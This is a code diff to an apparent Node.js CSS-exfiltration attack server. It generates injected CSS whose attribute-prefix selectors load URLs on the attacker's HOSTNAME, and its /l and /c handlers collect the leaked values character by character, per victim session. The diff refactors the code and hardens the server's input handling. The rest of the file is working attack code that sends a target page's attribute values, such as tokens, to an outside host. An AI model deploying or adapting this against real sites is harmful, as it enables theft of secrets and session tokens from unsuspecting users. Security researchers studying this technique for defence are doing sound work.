@@ -55,16 +55,25 @@ app.use('/l', function(request, response){
     response.end();
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) {                 
-            let elementNumber = +req.query.e;
+            const elementNumber = +req.query.e;
+            if(elementNumber > MAX_ELEMENTS) {                
+                return;
+            }
+            const prefixKey = getPrefix(element, attribute, elementNumber);
+            const prefixQueryValue = req.query[prefixKey];
+            if(typeof prefixQueryValue === 'undefined') {
+                continue;
+            }
+            if(prefixQueryValue.length > MAX_VALUE) {                
+                continue;
+            }
             if(n === +req.query.n && currentElementPos === elementNumber) {
-                if(typeof req.query['p_'+element[0]+attribute[0]+elementNumber] !== 'undefined') {
-                    if(!prefixes.has('p_'+element[0]+attribute[0]+elementNumber)) {
-                        prefixes.set('p_'+element[0]+attribute[0]+elementNumber, '');
-                    } 
-                    if(req.query['p_'+element[0]+attribute[0]+elementNumber].length > prefixes.get('p_'+element[0]+attribute[0]+elementNumber).length) {
-                        prefixes.set('p_'+element[0]+attribute[0]+elementNumber,req.query['p_'+element[0]+attribute[0]+elementNumber]);                        
-                        session.get(ip).set('foundToken',true);
-                    }
+                if(!prefixes.has(prefixKey)) {
+                    prefixes.set(prefixKey, '');
+                } 
+                if(prefixQueryValue.length > prefixes.get(prefixKey).length) {
+                    prefixes.set(prefixKey,String(prefixQueryValue));
+                    session.get(ip).set('foundToken',true);             
                 }
             }                
         }
@@ -98,11 +107,24 @@ app.use('/c', function(request, response){
         response.end();
         return;
     }
-    const tokens = session.get(ip).get('tokens',true);
+    const tokens = session.get(ip).get('tokens');
     let req = url.parse(request.url, url);
-    let attribute = req.query.a;
-    let tag = req.query.t;
-    let value = req.query.v;
+    let attribute = String(req.query.a);
+    let tag = String(req.query.t);
+    let value = String(req.query.v);
+
+    if(value.length > MAX_VALUE) {
+        return;
+    }
+
+    if(!ELEMENTS.includes(tag)) {
+        return;
+    }
+    
+    if(!ATTRIBUTES[tag].includes(attribute)) {
+        return;
+    }
+
     if(!hasToken(tokens,{tag, attribute, value})) {
         tokens.push({tag, attribute, value});
         session.get(ip).set('foundToken',true);
@@ -123,10 +145,11 @@ const genResponse = (request, response, elementNumber) => {
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) { 
             const variablePrefix = '--'+element[0]+'-'+attribute[0]+'-'+elementNumber+'-'+n;  
-            if(!prefixes.has('p_'+element[0]+attribute[0]+elementNumber)) {
-                prefixes.set('p_'+element[0]+attribute[0]+elementNumber, '');
+            const prefixKey = getPrefix(element, attribute, elementNumber);
+            if(!prefixes.has(prefixKey)) {
+                prefixes.set(prefixKey, '');
             }
-            const prefix = prefixes.get('p_'+element[0]+attribute[0]+elementNumber);
+            const prefix = prefixes.get(prefixKey);
             css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(tokens, element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
             css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]'+generateNotSelectors(tokens, element,attribute)+')'+'{'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
         }
@@ -283,4 +306,8 @@ function hasSession(ip) {
         }
     }
     return false;
+}
+
+function getPrefix(element, attribute, elementNumber) {
+    return 'p_'+element[0]+attribute[0]+elementNumber;
 }
